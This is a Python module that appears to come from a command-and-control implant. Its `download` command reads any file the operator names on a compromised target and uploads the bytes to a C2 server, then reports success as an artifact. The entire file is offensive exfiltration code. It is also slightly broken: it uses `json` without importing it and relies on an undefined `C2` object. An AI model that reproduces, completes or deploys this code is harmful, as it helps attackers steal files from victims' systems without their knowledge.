import os
import logging
from pathlib import Path
from typing import Dict, Any

def download(task: Dict) -> Dict:
    """Download file from target system to C2 server"""
    response = {
        "user_output": "",
        "completed": True,
        "status": "success",
        "artifacts": []
    }

    try:
        # Parse parameters
        params = json.loads(task.get("parameters", "{}"))
        file_path = params.get("path", "")
        
        if not file_path:
            response.update({
                "user_output": "Must supply a path to a file to download",
                "status": "error"
            })
            return response

        # Resolve and validate path
        target_path = Path(file_path).expanduser().resolve()
        
        if not target_path.exists():
            response.update({
                "user_output": f"File not found: {target_path}",
                "status": "error"
            })
            return response

        if not target_path.is_file():
            response.update({
                "user_output": f"Path is not a file: {target_path}",
                "status": "error"
            })
            return response

        # Read file contents
        try:
            with open(target_path, "rb") as f:
                file_data = f.read()
        except Exception as e:
            response.update({
                "user_output": f"Read failed: {str(e)}",
                "status": "error"
            })
            return response

        # Send to C2 server
        try:
            c2_response = C2.download(task, str(target_path), file_data)
            if not c2_response.get("success"):
                raise Exception("C2 server rejected file")
        except Exception as e:
            response.update({
                "user_output": f"Upload failed: {str(e)}",
                "status": "error"
            })
            return response

        response.update({
            "user_output": f"Successfully downloaded {target_path} ({len(file_data)} bytes)",
            "artifacts": [{
                "base_artifact": "File Download",
                "artifact": str(target_path)
            }],
            "download": {
                "full_path": str(target_path),
                "size": len(file_data),
                "content": file_data  # Only include if small/required
            }
        })

    except Exception as e:
        logging.exception("Download failed")
        response.update({
            "user_output": f"Critical error: {str(e)}",
            "status": "error"
        })

    return response